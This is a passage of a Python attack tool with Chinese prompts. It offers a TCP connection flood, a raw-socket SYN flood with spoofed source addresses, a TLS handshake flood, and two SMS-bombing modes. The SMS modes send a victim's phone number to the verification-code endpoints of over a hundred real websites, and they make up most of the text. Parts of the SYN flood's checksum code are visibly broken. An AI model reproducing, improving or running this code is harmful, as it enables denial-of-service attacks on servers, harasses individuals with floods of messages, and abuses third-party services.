                            nonlocal total_bytes, total_req
                            while alive:
                                try:
                                    with socket.create_connection((host, port), timeout=5) as s:
                                        s.sendall(req)
                                        while s.recv(1024): pass
                                    total_req += 1
                                    total_bytes += len(req)
                                except Exception:
                                    pass
                                
                        threads = [threading.Thread(target=worker, daemon=True) for _ in range(20)]
                        t0 = time.perf_counter()
                        for t in threads:t.start()
                    
                        try:
                            while True:
                                elapsed = time.perf_counter() - t0
                                if elapsed >= seconds:break
                                time.sleep(0.1)
                                print(f"\r已攻击 {total_req}次\t|\t流量 {byte_to(total_bytes)}\t|\t速率 {byte_to(total_bytes / elapsed)}/s | {elapsed:.1f}s", end="")
                        except (KeyboardInterrupt, EOFError):
                            pass
                        finally:
                            alive = False
                        for t in threads:t.join()
                    
                        print("\n攻击结束")
                        print(f"攻击次数 {total_req}次\t|\t流量 {byte_to(total_bytes)}\t|\t平均 {byte_to(total_bytes / (time.perf_counter() - t0))}/s")
                    main()
                
                case ("/wb", "syn"):
                    def byte_to(byte):
                        for u in ["B","KB","MB","GB"]:
                            if byte < 1024: return f"{byte:.2f}{u}"
                            byte /= 1024
                        return f"{byte:.2f}TB"
                    
                    try:
                        print("注意: SYN洪水部分逻辑触碰到底层，必须要获得设备管理员权限(Root权限)才能够运行!")
                        host = input("目标域名/IPV4: ")
                        port = int(input("目标端口: "))
                        threads = int(input("并发线程数: "))
                        seconds = float(input("持续秒数: "))
                    except ValueError:
                        print("输入格式不对!")
                    
                    def RFC1071(data):
                        if len(data) % 2:
                            data += b"\x00"
                        s = sum(struct.unpack("!%DH") % (len(data) // 2, data))
                        s = (s >> 16) + (s & 0xffff)
                        s += s >> 16
                        return ~s & 0xffff
                    
                    def pocket(ip, ports):
                        ip_ihl_ver = 0x45
                        ip_tos = 0
                        ip_len = 20 + 20
                        ip_id = random.randint(0, 0xffff)
                        ip_frag = 0
                        ip_ttl = 64
                        ip_proto = socket.IPPROTO_TCP
                        ip_src = socket.inet_aton(ip)
                        ip_dst = socket.inet_aton(host)
                        ip_hdr = struct.pack(
                            "!BBHHHBBH4s4s",
                            ip_ihl_ver, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, 0, ip_src, ip_dst
                        )
                        ip_hdr = ip_hdr[:10] + struct.pack("!H", RFC1071(ip_hdr)) + ip_hdr[12:]
                        
                        tcp_seq = random.randint(0, 0xffffffff)
                        tcp_ack = 0
                        tcp_off = 5 << 4
                        tcp_flags = 2
                        tcp_win = socket.htons(5840)
                        tcp_urg = 0
                        tcp_hdr = struct.pack(
                            "!HHLLBBHHH",
                            ports, port, tcp_seq, tcp_ack, tcp_off, tcp_flags, tcp_win, 0, tcp_urg
                        )
                        pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, ip_proto, len(tcp_hdr))
                        tcp_cksum = RFC1017(pseudo + tcp_hdr)
                        tcp_hdr = tcp_hdr[:16] + struct.pack("!H", tcp_cksum) + tcp_hdr[18:]
                        return ip_hdr + tcp_hdr
                    
                    sent_bytes = 0
                    lock = threading.Lock()
                    alive = True
                    
                    def worker():
                        global alive
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        except PermissionError:
                            print("无权限!请尝试开启ROOT或管理员权限")
                            return
                        
                        while alive:
                            src_ip = f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}"
                            src_port = random.randint(1024, 65535)
                            pkt = pocket(src_ip, src_port)
                            try:
                                s.sendto(pkt, (host, 0))
                                with lock:
                                    sent_bytes += len(pkt)
                            except OSError:pass
                        s.close()
                    
                    print(f"启动线程: {threads}\t|\t持续秒数: {seconds}\t|\t目标: {host}:{port}")
                    for _ in range(threads):
                        threading.Thread(target=worker, daemon=True).start()
                    
                    t0 = time.perf_counter()
                    try:
                        while True:
                            elapsed = time.perf_counter() - t0
                            if elapsed >= seconds:
                                break
                            with lock:
                                print(f"\r已发 {byte_to(sent_bytes)}\t|\t速率 {byte_to(sent_bytes / elapsed)}/s\t|\t{elapsed:.1f}s", end="")
                    except KeyboardInterrupt:print("退出攻击")
                    finally:
                        alive = False
                        time.sleep(0.2)
                        print(f"攻击结束\n总流量 {byte_to(sent_bytes)}\t|\t平均 {byte_to(sent_bytes / (time.perf_counter() - t0))}/s")
                
                case ("/wb", "ssl"):
                    try:
                        host = input("目标域名/IPV4: ")
                        port = int(input("目标端口: "))
                        threads = int(input("并发线程数: "))
                        seconds = float(input("持续秒数: "))
                    except ValueError:
                        print("输入格式不对!")
                        continue

                    lock = threading.Lock()
                    count = 0
                    alive = threading.Event()
                    alive.set()

                    def byte_to(byte):
                        for u in ["B", "KB", "MB", "GB"]:
                            if byte < 1024:
                                return f"{byte:.2f}{u}"
                            byte /= 1024
                        return f"{byte:.2f}TB"

                    def worker():
                        global count
                        sni = "".join(random.choices(string.ascii_lowercase, k=8)) + ".test"
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        while alive.is_set():
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(2)
                                with context.wrap_socket(sock, server_hostname=sni) as ssock:
                                    pass
                            except Exception:
                                pass
                            with lock:
                                count += 1

                    print(f"启动线程: {threads}\t|\t持续秒数: {seconds}\t|\t目标: {host}:{port}")

                    for _ in range(threads):
                        threading.Thread(target=worker, daemon=True).start()

                    t0 = time.perf_counter()
                    try:
                        while True:
                            elapsed = time.perf_counter() - t0
                            if elapsed >= seconds:
                                break
                            time.sleep(0.15)
                            with lock:
                                print(f"\r已握手 {count}次\t|\t速率 {count / elapsed:.1f}次/s\t|\t{elapsed:.1f}s", end="")
                    except KeyboardInterrupt:
                        print("\n用户中断攻击")
                    finally:
                        alive.clear()
                        time.sleep(0.2)
                        with lock:
                            print(f"\n攻击结束\n累计握手 {count}次\t|\t平均 {count / (time.perf_counter() - t0):.1f}次/s")
                
                case ("/wb", "sms1"):
                    class Sms:
                        def __init__(self, phone, qps):
                            self.phone = phone
                            self.qps = qps
                            self.running = True
                            self.ok = 0
                            self.fail = 0
                        
                        async def run(self):
                            loop = asyncio.get_event_loop()
                            while self.running:
                                await asyncio.gather(
                                    *[loop.run_in_executor(None, self.once) for _ in range(self.qps)]                                 
                                )
                                self.show()
                                await asyncio.sleep(0.5)
                            self.show(final=True)
                            
                        def once(self):
                            url = f"http://ic.service.unipus.cn/cert/vcode?phone={self.phone}&districtNumber=86&_t={int(time.time()*1000)}&r={random.randint(1000,9999)}"
                            url = yarl.URL(url, encoded=True)
                            
                            try:
                                with requests.get(
                                    url,
                                    headers={
                                        "User-Agent": "Mozilla/5.0",
                                        "Cache-Control": "no-cache"
                                    },
                                    allow_redirects=True,
                                    verify=False
                                ) as r:
                                    if r.status_code == 200:
                                        self.ok += 1
                                    else:
                                        self.fail += 1
                            except Exception as e:
                                    self.fail += 1
                                    
                        def show(self, final=False):
                            print(f"已轰炸: {int(self.ok + self.fail)}\t|\t成功次数: {self.ok}\t|\t失败次数: {self.fail}")
                            if final:print()
                                
                        def stop(self):self.running = False
                            
                    try:
                        phone = input("输入11位手机号: ").strip()
                        qps = input("输入每秒并发数量(默认5，不建议太大，会减慢速度): ").strip()
                        if not qps:
                            qps = 5
                        else:
                            try:
                                qps = int(qps)
                            except ValueError:
                                print("并发数需要无符号整数！")
                                
                        if phone == "" or not phone.isdigit() or len(str(phone)) != 11:
                            print("未输入或输入非11位数字!")
                        
                        bomb = Sms(phone, qps)
                        try:
                            print("开始轰炸，按Ctrl+C中断")
                            asyncio.run(bomb.run())
                        except KeyboardInterrupt:
                            print("\n轰炸中断")
                            bomb.stop()
                            
                    except ValueError:
                        print("输入格式不正确!")                                        
                    except EOFError:
                        print("输入被打断!")            
                
                case ("/wb", "sms2"):
                    warnings.filterwarnings("ignore")
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/114.0.0.0 Safari/537.36",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache"
                    }
                    
                    stop = False
                    def hansignal(sig, frame):
                        global stop
                        stop = True
                        print("\n轰炸中断")
                    signal.signal(signal.SIGINT, hansignal)
                        
                    def fetch(url, max_retry=3):
                        domain = urllib.parse.urlparse(url).netloc
                        for attempt in range(1, max_retry + 1):
                            if stop:
                                return "中断", url
                                
                            try:
                                response = requests.get(url, headers=headers, timeout=5, verify=False)
                                if response.status_code == 200:
                                    print(f"[成功]\t{domain}")
                                    return 200, url
                            except Exception:pass
                            if attempt < max_retry:
                                print(f"[失败]\t{domain}\t第{attempt}次失败，正在重试...")
                            else:
                                print(f"[失败]\t{domain}\t第{max_retry}次失败，放弃")
                        return "失败", url
                                                
                    async def sms_bomb(phone, qps, bn):
                        api_list = [
                            f"https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile={phone}",
                            f"https://evun.geely.com/mp/sys/user/captcha?mobile={phone}&type=1",
                            f"http://m.jinying.com/api/send_captcha.php?mobile={phone}&activity=pointcardWeb&expiry_min=3&companyNo=0145",
                            f"https://service.wzhxlx.com/wwyy/ceping/sendCode?channelId=99&mobile={phone}",
                            f"http://m.haiav.com/index.php?m=site&c=public&a=send_mobile_code&mobile={phone}&code=undefined&ismast=1",
                            f"http://www.icar-life.com/api/Connect/get_sms_captcha?type=1&phone={phone}",
                            f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1",
                            f"http://user.daojia.com/mobile/getcode?mobile={phone}",
                            f"https://proconsumer.taoche.com/c-usercenter-consumer/user/getCode?mobile={phone}",
                            f"http://hr.xfcbank.com/ajax/wap.php?action=get_authcode&mobile={phone}",
                            f"http://www.wuylh.com/userreg/commons/getsmscode?phone={phone}",
                            f"https://esma.iccec.cn/apis/esma/users/signup/mobile?mobile={phone}&blackLoading=true&agentId=100112",
                            f"https://account.bol.wo.cn/cuuser/cuauth/smscode?mobile={phone}&smsType=2&clientId=woprom",
                            f"http://uniwechat.saicskoda.com.cn/wxPage/WebHandler.ashx?userid=oeXPu5-_nc6Yr6JmU8vj720WZ6wg&toid=08161&type=sendsms&tel={phone}",
                            f"https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone={phone}&type=2&v=1626775646428",
                            f"https://mall-cashback.tinman.cn/noRight/campaign/send-verification-code?phone={phone}",
                            f"http://www.51hengsheng.com/proxy/verify!sendVerify.do?dto.phone={phone}&dto.tempNumber=SMS_107505040",
                            f"http://zg99.offcn.com/index/chaxun/sendmsg?actid=40386&callback=jQuery111306786107026988504_1627575799465&phone={phone}&_=1627575799466",
                            f"https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632490428&cnzz_eid=1185173797-1632490428-&showp=424x906&p=",
                            f"http://api.nysytijian.com/api/common/GetVerifyCode?phoneNumber={phone}",
                            f"https://editor.588ku.com/site-api/send-tel-login-code?num={phone}&csrfToken=u1yzmFkHty7RXv0zSXJ7sLNTAs4ax6KfYciaU6GZKYXpkJHGQJXcM0IuJ-GrjMhUl9mcRx6Jnp6dWESUThFYog==",
                            f"https://ihealth.zhongan.com/api/whale/v1/H5/gift/message/sendSmsCode/1000000003?phone={phone}&productCode=AT34&envSource=browser",
                            f"https://m.95303.com/api/OrderYx/GetCodeBySMS?mobile={phone}&_=1626625066773",
                            f"https://www.51hawo.com/apollo/MobileCode/sendMobileCode?mobile={phone}&sms_type=101&register_from=20000091",
                            f"http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile={phone}&type=Mobile&checktext={phone}&_=1624877392029",
                            f"https://gwbk.zhongan.com/dmapiv2/za-dm-insure/dm/user/sendSMGCode?mobilePhone={phone}",
                            f"https://m.lu.com/user/service/login/otp-login-pre-check?mobileNo={phone}&skipPwd=1",
                            f"https://igetcool-share.igetcool.com/mall-server/api/smscode/sendSmscode?phone={phone}&countrycode=86&smstype=0&type=0",
                            f"https://pro.ouyeel.com/api/users/userApi/sendMsg?mobile={phone}",
                            f"https://www.sensorsdata.cn/api/passport/sms/quest_new/{phone}?_t=qajgslud4i",
                            f"https://xzqk.nethone.cn/addons/yun_shop/api.php?i=2&uuid=0&mid=28732&type=5&shop_id=null&basic_info=1&validate_page=1&route=member.register.sendCodeV2&mobile={phone}&state=86&captcha=undefined&code=undefined",
                            f"https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632524303&cnzz_eid=1185173797-1632490428-&showp=424x906&p={phone}",
                            f"https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode?mobile={phone}",
                            f"https://web-agent.tope365.com/msg/sms/codeSend?phone={phone}",
                            f"https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone={phone}&descriptionType=1&codeType=2",
                            f"http://gift.1liwu.cn/index.php?g=Wechat&m=User&a=sms&interface=1&mobile={phone}",
                            f"https://m.qt.hrse.com.cn/sms/register?phone={phone}&_=1628777374003",
                            f"http://www.pmax.cn/Home/Index/sendcaptcha.html?user={phone}&type=register&_=1632119551730",
                            f"https://vipwx.robam.com/robam-api/common/sms/code/{phone}?_r=1628670219261",
                            f"https://gl.dayday521.com/addons/yun_shop/api.php?i=1&mid=0&type=5&shop_id=null&route=member.register.sendCodeV2&mobile={phone}&state=86&captcha=undefined&code=undefined&sms_type=1",
                            f"https://huoke.prod.k12.vip/poem/common/sendCode?phone={phone}&fromType=1",
                            f"https://mytxkt.grazy.cn/wapApi/getCode?source_type=h5&mobile={phone}&area_code=%2B86",
                            f"http://c.boaov.org/boaoweb/lrsp/getyzmcode.do?xsid=&tel={phone}",
                            f"https://818ps.com/site-api/send-tel-login-code?num={phone}&codeImg=undefined",
                            f"http://www.365liye.com/API/Site/Member/SendCode?tel={phone}",
                            f"http://mayi-api.91ants.com/shared/sms/code?mobile={phone}",
                            f"https://h5.17k.com/ck/user/mobile/{phone}/message?smsType=1&appKey=1351550300",
                            f"https://sjapi.aihuishou.com/sj-api/auth/send/login-message?timestamp={int(time.time()*1000)}&mobile={phone}",
                            f"http://ershoucheapi.58.com/cheyuan/comm/smsCode.do?callback=jQuery17208815301240499984_1623173514122&phone={phone}&code=send&_=1623173533089",
                            f"http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName={phone}",
                            f"https://wwyy.wzhxlx.com/wwyy/ceping/sendCode?channelId=99&entry=wzhxl_cdl_20200402&mobile={phone}",
                            f"http://www.00800.com.cn/cnhs/wqproject/index.php?app=public&mod=Passport&act=sendmsg&area_code=%2B86&phone={phone}",
                            f"https://sunacliving.sunac.com.cn/member/wap/member/index/doCheckKaptcha?mobile={phone}",
                            f"https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone={phone}&type=2&v=1626743584518",
                            f"https://m.zhuna.cn/login/sendCode.html?mobile={phone}",
                            f"https://guanjia.10010.com/front/auth-register/verification-code?mobile={phone}&openid=ol_FD5gTjAr1mxTGSIa5ZG8sHgII",
                            f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={phone}",
                            f"http://api.pangxiaolu.com/pangxiaolu/user/code?mobile={phone}&area=86",
                            f"https://uat-wxmall.yaic.com.cn/wxTerminal/binding/getVerificationCodeYaic.do?requestType=3&mobile={phone}&sendTime=1626107386421",
                            f"https://www.hainanwangdai.com/api/v1/user/agreement/privacy/status?utmSource=yrd_m_web&phone={phone}",
                            f"https://m.chinawutong.com/ashx/SendSMS.ashx?code={phone}&Kind=login&CodeType=sms&ran=0.11568426389851116",
                            f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={phone}",
                            f"https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={phone}",
                            f"http://static.likuso.com/user/update_shoujiyzm?callback=jQuery18307715529120842468_1624032951145&shouji={phone}&yzm=51826&_=1624032964470",
                            f"https://m.588ku.com/common/send-sms?phone={phone}",
                            f"https://www.donews.com/login/getcode?tel={phone}&time=0.4155787879991961",
                            f"https://kingcard.dgunicom.com/lsd-message/send/captcha/phone/v1?phoneNumber={phone}",
                            f"http://www.hanmeiju.com/memberverify/ajax/sendVerify.do?compType=member_register-15337078706993653&verifyType=SMS&value={phone}",
                            f"http://www.futureartdraw.com/code/api/?tel={phone}",
                            f"http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum={phone}",
                            f"https://m.paperword.com/mobile/code/v2/login/code?promote=0&mobile={phone}",
                            f"https://m.baixiu.org/Inc/ajax/IsRegister1.aspx?mobile={phone}",
                            f"http://m.114-91.com/common/api?cmd=APPMemberGetCheckCode&mobile={phone}&type=1&md5ParamNames=mobile%2Ctype",
                            f"http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile={phone}&type=2",
                            f"http://ai-piano.kuaipeilian.com/ai-piano/user/code?mobile={phone}&area=86",
                            f"https://www.tzqc.net//api/user/UserIndex/sendSms?client=app&type=quickLogin&mobile={phone}",
                            f"https://www.lanniuh.com/web-bin/m/weChat/weChatPublic/get_message_info?phone={phone}&smsType=0&hospCode=42609044-5",
                            f"https://api.mall.autohome.com.cn/gateway/sms/sendVerificationCode?_appid=mall&mobile={phone}&type=11&callback=sendVerificationCodeSuccess",
                            f"https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303389149111755325_1624013936898&type=5&phone={phone}",
                            f"https://account.bol.wo.cn/cuuser/cuauth/smscode?mobile={phone}&smsType=2&clientId=hfgo",
                            f"https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber={phone}",
                            f"https://msgo.10010.com/lsd-message/send/captcha/phone/v1?phoneNumber={phone}",
                            f"https://usercenter.i4.cn/pcuser_sendSms.action?json=&member.appId=2944&member.phone={phone}&member.source=0&member.platform=1",
                            f"http://lht-app.lhtex.com.cn:22225/lht/smsCode/save?mobile={phone}&mtype=0",
                            f"https://partner.10046.mi.com/miMobileOrder/sendSms?phoneNumber={phone}",
                            f"https://www.adidas.com.cn/member/sendMobileMessage.json?mobile={phone}&_=1624164095577",
                            f"http://stc.enjoyha.com/api/user/sms/send?mobile={phone}&codeType=0",
                            f"https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone={phone}&type=login",
                            f"https://www.ttljf.com/ttl_site/user.do?mthd=getCheckCode&phoneNumber={phone}",
                            f"https://scapi.taodingding.com/getCode?phone={phone}",
                            f"http://lht-app.lhtex.com.cn:22225/lht/smsCode/save?mtype=0&mobile={phone}",
                            f"http://m.5khouse.com/ashx/yzm.ashx?tel={phone}&ys=hqyzm&sj=0.11739289648424056",
                            f"https://51tiaojiu.com/mobile/login/get_phone_code.html?user_phone={phone}",
                            f"https://www.hollycrm.com/messageInterface/sendVerifyMessage.php?telNum={phone}&actionId={phone}-828704&info=hollycrm400",
                            f"https://mp.vasen.com/weixingmobileservice/client/getphonecodeByphoneregister?phonenumber={phone}",
                            f"http://www.shejiyue.com:8080/SjyWebService/sendQuickCode.do?mobilePhone={phone}",
                            f"https://www.huodongxing.com/account/checkphoneexist?phone={phone}",
                            f"https://api2.paixin.com/users/code?phone=0086{phone}",
                            f"https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile={phone}",
                            f"http://www.antong56.com/dc/register/sendSMS?mobile={phone}",
                            f"http://hz.l9c.cn//api.php?act=user&key=eeKBYDpZs3jiA5j3Sd&phone={phone}",
                            f"https://www.nsxxs.cc/api.php?hm={phone}",
                            f"https://2carapi.haval.com.cn/open/api/wap/member/sendSSOCode?mobile={phone}&type=login",
                            f"https://m.atomychina.com.cn/cn/api/account/certification?method=1&methodData={phone}&mode=1",
                            f"http://66.xn--kiv58k544a.site/api.php?act=user&key=6iyBjBSiYy6G8kiogb&phone={phone}",
                            f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=0",
                            f"https://m.mgqr.com/ajax/getcode_reg.ashx?phone={phone}&check=0&t=1620219103066",
                            f"https://sms-server.gaodun.com/index.php?from=ldyhrBvmvJOdPCPb&act=chk&phone={phone}",
                            f"https://wap.china0001.com.cn/reg/sendverycode/company=&truename=&mobile={phone}",
                            f"https://www.donews.com/login/getcode?tel={phone} &time=0.4155787879991961",
                            f"https://www.d7w.net/index.php?g=Member&m=Api&a=getmobilecode_binding&j=json&mobile={phone}",
                            f"https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone={phone}",
                            f"http://id.ifeng.com/api/simplesendmsg?mobile={phone}",
                            f"https://flights.sichuanair.com/3uair/ibe/profile/processSendSMSNew.do?ConversationID=&smsType=REGISTER&mobilePhone={phone}&verkey=MOBILELOGIN",
                            f"http://api.bangtuike.com.cn/api/v1/account/captcha?phone={phone}&country=%2B86",
                            f"http://ws.sythealth.com/wsbyte/fit/v4/sms/validatorcode?form=0&account={phone}",
                            f"https://puser.hnzwfw.gov.cn/api/user/sms?mobile={phone}&_=1592528454449",
                            f"http://www.qmango.com/users/ajax/ajax_register_code.asp?_=1487743660579&mobile={phone}",
                            f"https://www.1dagong.com/Login/sendCode?mobile={phone}",
                            f"http://edms.fcbox.com/hibox/weixin/getVerifyCode?mobilePhone={phone}",
                            f"https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber={phone}",
                            f"https://www.rongyihuahua.com/jud/verifyCode?isLoaner=true&phone={phone}",
                            f"https://gwbk.zhongan.com/dmapiv2/za-dm-insure/dm/user/sendSMGCode?mobilePhone={phone}&from=web",
                            f"http://www.sk-vip.cn/index.php?m=&c=page&a=yunhu&phone={phone}",
                            f"https://app.zhuanzhuan.com/zz/transfer/getCaptcha?type=1&mobile={phone}",
                            f"http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?phoneNumber={phone}&regTimeCode=1589627585503",
                            f"https://join.xiaodianpu.com/api/vc/v1/login/sendSmsCode?telPhone={phone}&type=1http://www.tzkspt.com/index.php?user-app-register-mscode&mobile={phone}",
                            f"http://m.lyrce.net/smsreg.php?YSJ={phone}http://800qph500.ahguanchen.com/API/Common/GetPhoneVerifyCode?phoneNo={phone}&msgType=1&v=012144239140090107",
                            f"http://www.waizongguan.com/PostMobileNum.aspx?mobile={phone}",
                            f"http://mobile.iqihang.com/api/v2/user/send-sms?phone={phone}&cmd=20&verifyCode=http://m.coursemall.cn/passport/regcode?mobile={phone}",
                            f"http://www.patfun.com/do.php?ac=check_sms&phone={phone}",
                            f"http://www.upshop.cn/Home/User/registerSendCode.html?mobile={phone}",
                            f"http://www.zhichiwangluo.com/index.php?r=Login/phoneResetCode&phone={phone}",
                            f"https://hdh.10086.cn/common/validationIP?phone={phone}",
                            f"http://tools.wx6.org/dianhuahongzhaji/?telcode={phone}",
                            f"http://www.happigo.com/shop/index.php?act=login&op=send_auth_code&mobile={phone}",
                            f"https://host.convertlab.com/sms/get?mobile={phone}&name=Convertlab&token=4080fdef3cb44298852d226af95b2502&type=form&uuid=4a48dbfe8e1d49ab87715d2ed8e6e79d",
                            f"https://5.9188.com/user/sendSms.go?mobileNo={phone}",
                            f"http://m.xymens.com/index.php/Home/User/send_code?mobile={phone}",
                            f"http://www.51zouchuqu.com/sms/send?mobileNo={phone}",
                            f"http://user.memeyule.com/authcode/send_mobile?china=true&mobile={phone}",
                            f"http://m.egou.com/validate_phone.htm?phone={phone}",
                            f"http://www.zjsgat.gov.cn:8080/was/portals/cxfw/checkusermobile.jsp?mobilephone={phone}",
                            f"http://admin.bongv.com/Home/Modify/sendSmsCode_New.shtml?mp={phone}",
                            f"http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={phone}&appId=www_home&v=2&sig=&t=1592615855903&v=2",
                            f"http://tel.kuaishang.cn/cl.php?tel={phone}",
                            f"http://www.100ppi.com/ecp/ppi/get_sf/get_yzm.php?m={phone}",
                            f"http://m.tk.cn/tkmobile/service/member?function_code=dynamicLogin&login_mobile={phone}",
                            f"http://www.suicunsuiqu.com/front/account/verifyMobileReg?mobile={phone}",
                            f"http://www.jiqinging.com/ajax.php?do=getCheckCode+tel={phone}",
                            f"https://5.9188.com/activity/activityMobileCheck.go?id=qzkj&mobileno={phone}",
                            f"http://www.jiqinging.com/ajax.php?do=getCheckCode&tel={phone}",
                            f"http://www.xlcidc.com/chkName.asp?umobie={phone}&lm=sendmobi&sd=0.5806221691630391",
                            f"http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile={phone}",
                            f"http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={phone}",
                            f"https://user.meilimei.com/taomi/user/sendSmsCaptcha?mobile={phone}",
                            f"http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum={phone}",
                            f"https://passport.eqxiu.com/eqs/sms/token?phone={phone}&type=quickLogin&checkPhone=1&channel=21&version=4.4.1",
                            f"http://b2c.csair.com/portal/smsMessage/EUserVerifyCode?mobile={phone}",
                            f"https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone={phone}",
                            f"http://www.ryzwz.com/index.php?hm={phone}&ok=",
                            f"http://cthwallet.com/en/data/dy/index.php?hm={phone}",
                            f"http://hezi.ainide.cn/hzq/lt213.php?hm={phone}",
                            f"http://www.52fzlt.cn/api.php?hm={phone}",
                            f"https://yun.2ov.xyz/api.php?hm={phone}"
                        ] * bn
                        
                        loop = asyncio.get_running_loop()
                        with concurrent.futures.ThreadPoolExecutor(max_workers=qps) as pool:
                            tasks = [
                                pool.submit(fetch, url)
                                for url in api_list
                            ]
                            for futures in concurrent.futures.as_completed(tasks):
                                if stop:break
                                futures.result()
                                            
                    try:
                        phone = input("输入11位手机号: ").strip()
                        qps = input("输入最大并发数量(默认10，不建议太大，会减慢速度): ").strip()
                        bn = input("压力倍数(不填则为10): ")
                        if not qps:qps = 5
                        if not bn:bn = 5
                        else:
                            try:
                                qps = int(qps)
                                bn = int(bn)
                            except ValueError:
                                print("最大并发数或压力倍数需要无符号整数!")
                                
                        if phone == "" or not phone.isdigit() or len(str(phone)) != 11:
                            print("未输入或输入非11位数字!")
                        
                        try:
                            asyncio.run(sms_bomb(phone, qps, bn))
                        except KeyboardInterrupt:pass
                        print("退出。")                        
                    except ValueError:
                        print("输入格式不正确!")
                    except EOFError:
                        print("输入被打断!")
                
                case _:
                    print("\033[31m未知指令!\033[0m")